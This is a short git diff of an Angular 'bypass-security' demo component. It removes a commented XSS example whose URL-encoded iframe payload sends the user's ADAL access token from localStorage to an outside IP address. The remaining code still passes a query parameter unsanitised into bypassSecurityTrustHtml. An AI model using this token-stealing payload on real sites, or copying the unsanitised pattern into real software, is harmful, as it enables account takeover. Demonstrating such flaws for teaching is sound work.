@@ -8,12 +8,8 @@ import { DomSanitizer, SafeResourceUrl, SafeUrl, SafeHtml} from '@angular/platfo
   styleUrls: ['./bypass-security.component.css']
 })
 export class BypassSecurityComponent implements OnInit {
-
   name: SafeHtml;
   nameURL: SafeUrl;
-
-  // XSS Example for Demo
-  // http://localhost:4200/bypass?name=%3Ciframe%20src%3Djavascript:window.location.href%3D%27http:%2F%2F104.40.75.104:8000%2F17xsend1%3Ftoken%3D%27%2Bwindow.localStorage.getItem(%22adal.access.token.keyfea922e0-f20b-4038-bc96-aa7be62c6e2e%22)%3E%3C%2Fiframe%3E 
 
   constructor(private sanitizer: DomSanitizer, private activatedRoute: ActivatedRoute) {
     this.name = sanitizer.bypassSecurityTrustHtml(this.activatedRoute.snapshot.queryParams['name']);
